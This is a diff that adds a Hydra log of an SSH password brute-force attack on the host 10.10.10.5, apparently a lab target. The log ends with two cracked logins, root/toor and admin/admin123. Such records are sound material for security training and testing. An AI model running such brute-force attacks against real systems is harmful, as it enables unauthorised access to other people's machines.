@@ -1,0 +1,9 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-21 12:00:00
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14372499 login tries (l:3/p:4790833), ~898281 tries per task
+[DATA] attacking ssh://10.10.10.5:22/
+[22][ssh] host: 10.10.10.5   login: root   password: toor
+[22][ssh] host: 10.10.10.5   login: admin   password: admin123
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-21 12:05:00
